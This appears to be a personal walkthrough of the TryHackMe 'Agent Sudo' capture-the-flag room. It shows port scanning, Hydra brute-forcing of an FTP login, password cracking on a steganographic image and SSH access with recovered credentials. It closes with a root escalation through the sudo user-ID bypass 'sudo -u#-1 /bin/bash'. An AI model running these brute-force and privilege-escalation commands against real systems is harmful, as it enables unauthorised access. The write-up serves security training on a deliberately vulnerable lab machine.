- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Scenario

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

# Recon
## Nmap

We add the host in /etc/hosts (sudo.thm) and scan with our [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) tool :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/AgentSudo]
└─$ nmap  -A -p- 10.10.17.51

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))


```

# Enumeration
## HTTP (80)

### Gobuster

We start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the http [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/AgentSudo]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://sudo.thm 
    



```

nothing.

### FFuf

We run [FFuf](../../3%20-%20Tags/Hacking%20Tools/FFuf.md) and check **Size** then re-run with correct filter-size (-fs) :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/AgentSudo]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.sudo.thm' -u http://sudo.thm -fs 218 -c  


```

nothing.

### Website

<img src="../../2%20-%20Resources/Others/Flameshots/d1e991aac0330206ce335ec112638db9.png" alt="d1e991aac0330206ce335ec112638db9.png" width="370" height="171" class="jop-noMdConv">

So we need the **codename** .

We modify the user-agent in the request in [Developer tools](../../3%20-%20Tags/Hacking%20Concepts/Developer%20tools.md) and resend it, we find a page:

<img src="../../2%20-%20Resources/Others/Flameshots/a3e1cd23a665cff66f9bd84751957fff.png" alt="a3e1cd23a665cff66f9bd84751957fff.png" width="655" height="127" class="jop-noMdConv">

We have a username .

## FTP

We don't have anonymous access in [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) .

### Hydra

We can crack the password of the found user with [Hydra](../../3%20-%20Tags/Hacking%20Tools/Hydra.md) using her wizard:

```
Welcome to the Hydra Wizard

Enter the service to attack (eg: ftp, ssh, http-post-form): ftp
Enter the target to attack (or filename with targets): sudo.thm
Enter a username to test or a filename: chris
Enter a password to test or a filename: /usr/share/wordlists/rockyou.txt
If you want to test for passwords (s)ame as login, (n)ull or (r)everse login, enter these letters without spaces (e.g. "sr") or leave empty otherwise: 
Port number (press enter for default): 21

[DATA] attacking ftp://sudo.thm:21/
[21][ftp] host: sudo.thm   login: chris   password: crystal

```

### First Access

Now we can enter [FTP](../../3%20-%20Tags/Hacking%20Concepts/FTP.md) to see what's there and get it to our directory :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/AgentSudo]
└─$ ftp sudo.thm   
Connected to sudo.thm.
220 (vsFTPd 3.0.3)
Name (sudo.thm:mdn0x): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||5195|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png

```

Now we cat these :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/AgentSudo]
└─$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```

### Stegcracker

We use [Stegcracker](../../3%20-%20Tags/Hacking%20Tools/Stegcracker.md) to crack the password for extraction :

```
                                                                                         
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/AgentSudo]
└─$ stegcracker cute-alien.jpg 

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'cute-alien.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: Area51doro1111
Tried 440947 passwords
Your file has been written to: cute-alien.jpg.out
Area51

```

So let's cat it :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/AgentSudo]
└─$ cat cute-alien.jpg.out 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
                                                    
```

We have another username for J and another password, probably ssh.

First we try cred in ftp but no.

# SSH

We don't have anonymous access in [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) .

Now we can access with the credentials found :

```
┌──(mdn0x㉿mdn0xKali)-[~/THM/CHALLENGES/Easy/AgentSudo]
└─$ ssh james@sudo.thm        
james@sudo.thm's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7

```

I want the jpg i think i found another password so i open a server on target machine and access it through mine :

```
james@agent-sudo:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

```

Now we go there and dwonload it, then we do a quick search for it .

# Privilege Escalation

we check for sudo -l for the [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) :

```
james@agent-sudo:~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

```

So we search for  `(All, !root) /bin/bash` and we got the [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) :

<img src="../../2%20-%20Resources/Others/Flameshots/b8570c8b4541bfc528579b16a27cb7a3.png" alt="b8570c8b4541bfc528579b16a27cb7a3.png" width="396" height="286" class="jop-noMdConv">

### Exploit

Run the exploit `sudo -u#-1 /bin/bash`  :

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# cd ..
root@agent-sudo:/home# ls
james
root@agent-sudo:/home# cd ..
root@agent-sudo:/# cd root
root@agent-sudo:/root# 
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
    
```

### (Bonus) Who is Agent R? Deskel .

Pwned !!
